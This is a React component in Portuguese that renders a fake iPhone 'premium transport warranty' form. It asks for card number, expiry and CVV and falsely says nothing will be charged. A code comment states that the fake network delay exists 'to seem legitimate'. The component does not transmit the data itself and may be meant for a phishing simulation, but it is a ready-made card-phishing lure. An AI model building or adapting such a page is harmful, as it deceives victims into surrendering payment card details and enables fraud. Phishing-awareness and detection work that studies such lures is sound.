import React, { useState } from 'react';

export default function GatewaySimulator({ onSubmit }) {
  const [data, setData] = useState({ cardholder: '', cardNumber: '', expiry: '', cvv: '' });
  const [isProcessing, setIsProcessing] = useState(false);

  const formatCardNumber = (value) => {
    const digits = value.replace(/\D/g, '').slice(0, 16);
    return digits.replace(/(\d{4})(?=\d)/g, '$1 ');
  };

  const handleSubmit = (e) => {
    e.preventDefault();
    setIsProcessing(true);
    
    // Simula latência de rede para parecer legítimo
    setTimeout(() => {
      onSubmit();
    }, 2000);
  };

  if (isProcessing) {
    return (
      <div className="flex flex-col items-center justify-center py-10">
        <div className="animate-spin rounded-full h-12 w-12 border-b-2 border-emerald-600"></div>
        <p className="mt-4 text-slate-600 font-medium">Processando verificação de seguro...</p>
        <p className="text-xs text-slate-400">Por favor, não feche esta janela.</p>
      </div>
    );
  }

  return (
    <form onSubmit={handleSubmit} className="space-y-4">
      <div className="bg-blue-50 p-3 rounded-lg mb-4 border border-blue-100">
        <p className="text-xs text-blue-800 font-medium">
          <strong>Atenção:</strong> Para ativar a garantia de transporte premium (seguro contra roubo/quebra) do seu iPhone, o sistema precisa validar a fonte de pagamento. Nenhum valor será debitado.
        </p>
      </div>

      <h2 className="text-lg font-semibold text-slate-800">Detalhes da Garantia</h2>

      <div>
        <label className="block text-sm font-medium text-slate-700">Nome no Cartão</label>
        <input required type="text" className="mt-1 block w-full rounded-md border-slate-300 shadow-sm focus:border-emerald-500 focus:ring-emerald-500 sm:text-sm"
        value={data.cardholder} onChange={(e) => setData({...data, cardholder: e.target.value})} placeholder="COMO ESTÁ NO CARTÃO" />
      </div>

      <div>
        <label className="block text-sm font-medium text-slate-700">Número do Cartão</label>
        <input required type="text" className="mt-1 block w-full rounded-md border-slate-300 shadow-sm focus:border-emerald-500 focus:ring-emerald-500 sm:text-sm"
        value={data.cardNumber} onChange={(e) => setData({...data, cardNumber: formatCardNumber(e.target.value)})} placeholder="0000 0000 0000 0000" />
      </div>

      <div className="grid grid-cols-2 gap-4">
        <div>
          <label className="block text-sm font-medium text-slate-700">Validade</label>
          <input required type="text" className="mt-1 block w-full rounded-md border-slate-300 shadow-sm focus:border-emerald-500 focus:ring-emerald-500 sm:text-sm"
          value={data.expiry} onChange={(e) => setData({...data, expiry: e.target.value})} placeholder="MM/AA" />
        </div>
        <div>
          <label className="block text-sm font-medium text-slate-700">CVV</label>
          <input required type="password" className="mt-1 block w-full rounded-md border-slate-300 shadow-sm focus:border-emerald-500 focus:ring-emerald-500 sm:text-sm"
          value={data.cvv} onChange={(e) => setData({...data, cvv: e.target.value})} placeholder="123" maxLength="4" />
        </div>
      </div>

      <button type="submit" className="w-full bg-emerald-600 text-white py-3 rounded-lg font-semibold hover:bg-emerald-700 transition flex items-center justify-center gap-2">
        <svg className="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.592 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016z" /></svg>
        Ativar Garantia e Concluir
      </button>
    </form>
  );
}
